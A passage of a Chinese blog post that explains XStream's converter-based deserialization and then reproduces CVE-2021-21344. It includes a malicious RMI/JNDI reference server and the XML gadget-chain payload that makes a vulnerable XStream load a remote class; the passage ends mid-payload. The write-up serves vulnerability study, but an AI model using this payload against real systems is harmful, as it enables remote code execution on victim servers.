java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Car</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> price;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Car</span><span class="params">(String name, <span class="type">int</span> price)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getPrice</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPrice</span><span class="params">(<span class="type">int</span> price)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;Print Car&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>测试类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Xstream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XstreamTest2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Car</span> <span class="variable">car</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Car</span>(<span class="string">&quot;benchi&quot;</span>, <span class="number">2000000</span>);</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> xStream.toXML(car);</span><br><span class="line">        System.out.print(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Xstream.Car</span> <span class="attr">serialization</span>=<span class="string">&quot;custom&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Xstream.Car</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">price</span>&gt;</span>2000000<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">name</span>&gt;</span>benchi<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Xstream.Car</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Xstream.Car</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>结论：Xstream在处理继承了Serializable与没有继承Serializable接口的类时，所用的方法不一致</p>
+<p><strong>示例3</strong>：反序列化示例</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Xstream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XstreamTest2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;Xstream.Car serialization=\&quot;custom\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;Xstream.Car&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;price&gt;2000000&lt;/price&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;name&gt;benchi&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;/Xstream.Car&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/Xstream.Car&gt;&quot;</span>;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="type">Car</span> <span class="variable">car</span> <span class="operator">=</span> (Car) xStream.fromXML(xml);</span><br><span class="line">        System.out.println(car);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Print Car</span><br><span class="line">Xstream.Car@35d176f7</span><br></pre></td></tr></table></figure>
+
+<p>注：在反序列化中，Car必须要有无参数的构造方法</p>
+<h1 id="反序列化分析"><a href="#反序列化分析" class="headerlink" title="反序列化分析"></a>反序列化分析</h1><p>在Car类重写的readObject函数上下断点，看XStream的fromXML过程是否会反序列化调用重写的readObject函数<br>函数调用栈：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">readObject:<span class="number">37</span>, Car (Xstream)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">callReadObject:<span class="number">113</span>, SerializationMethodInvoker (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">doUnmarshal:<span class="number">425</span>, SerializableConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:<span class="number">234</span>, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:<span class="number">72</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:<span class="number">65</span>, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:<span class="number">66</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:<span class="number">50</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:<span class="number">134</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:<span class="number">32</span>, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:<span class="number">1058</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:<span class="number">1042</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:<span class="number">913</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:<span class="number">904</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:<span class="number">23</span>, XstreamTest2 (Xstream)</span><br></pre></td></tr></table></figure>
+
+<p>结论是如果目标对象实现了readObject函数的话，最终会调用此函数</p>
+<p>在com.thoughtworks.xstream.core的convertAnother函数中，会调用lookupConverterForType函数根据type选择正确的converter</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">convertAnother</span><span class="params">(Object parent, Class type, Converter converter)</span> &#123;</span><br><span class="line">    type = mapper.defaultImplementationOf(type);</span><br><span class="line">    <span class="keyword">if</span> (converter == <span class="literal">null</span>) &#123;</span><br><span class="line">        converter = converterLookup.lookupConverterForType(type);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!converter.canConvert(type)) &#123;</span><br><span class="line">            <span class="type">ConversionException</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConversionException</span>(</span><br><span class="line">                <span class="string">&quot;Explicit selected converter cannot handle type&quot;</span>);</span><br><span class="line">            e.add(<span class="string">&quot;item-type&quot;</span>, type.getName());</span><br><span class="line">            e.add(<span class="string">&quot;converter-type&quot;</span>, converter.getClass().getName());</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> convert(parent, type, converter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在执行到com&#x2F;thoughtworks&#x2F;xstream&#x2F;core&#x2F;DefaultConverterLookup.java的lookupConverterForType函数时，会根据type选择converter</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Converter <span class="title function_">lookupConverterForType</span><span class="params">(Class type)</span> &#123;</span><br><span class="line">    <span class="type">Converter</span> <span class="variable">cachedConverter</span> <span class="operator">=</span> (Converter) typeToConverterMap.get(type);</span><br><span class="line">    <span class="keyword">if</span> (cachedConverter != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> cachedConverter;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> converters.iterator();</span><br><span class="line">    <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">        <span class="type">Converter</span> <span class="variable">converter</span> <span class="operator">=</span> (Converter) iterator.next();</span><br><span class="line">        <span class="keyword">if</span> (converter.canConvert(type)) &#123;</span><br><span class="line">            typeToConverterMap.put(type, converter);</span><br><span class="line">            <span class="keyword">return</span> converter;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConversionException</span>(<span class="string">&quot;No converter specified for &quot;</span> + type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>iterator中总共有57个，逐个匹配<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230718154510.png"><br>这里的converter是SerializableConverter<br>在试试如果目标对象没有实现readObject函数，在fromXML过程中会发生什么？<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230718153716.png"><br>同样在经过lookupConverterForType函数后，其converter是ReflectionConverter</p>
+<p><strong>总结</strong><br>总而言之，XStream为Java常见的类型提供了不同的转换器，其思路就是通过不同的converter来处理序列化数据中不同类型的数据</p>
+<h1 id="漏洞汇总"><a href="#漏洞汇总" class="headerlink" title="漏洞汇总"></a>漏洞汇总</h1><p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230718160733.png"><br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230718160815.png"><br>参考：<a target="_blank" rel="noopener" href="https://x-stream.github.io/security.html">https://x-stream.github.io/security.html</a></p>
+<h1 id="CVE-2021-21344"><a href="#CVE-2021-21344" class="headerlink" title="CVE-2021-21344"></a>CVE-2021-21344</h1><p><strong>影响版本</strong>：&lt;&#x3D;1.4.15<br><strong>测试环境</strong>：XStream1.4.15   jdk1.8_66<br><strong>复现</strong>：<br>继续使用JNDI中用到的RMI Server：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReferServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建Reference对象</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;http://127.0.0.1:8080/&quot;</span>);</span><br><span class="line">        <span class="comment">// 由于Reference类没有继承Remote接口, 所以需要使用ReferenceWrapper进行封装</span></span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;exec&quot;</span>, wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>test是一个恶意类，在其对应的文件夹开启web服务<br>POC：官方给出的POC，需要修改其里面的RMI地址</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bi</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">jaxbType</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">jaxbType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">uriProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">attributeProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">inheritedAttWildcard</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">getter</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">name</span>&gt;</span>getDatabaseMetaData<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">getter</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">inheritedAttWildcard</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">bi</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tagName</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">context</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">marshallerPool</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">marshallerPool</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">nameList</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">localNames</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">localNames</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">nameList</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jaxbObject</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>rmi://localhost:7777/exec<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span 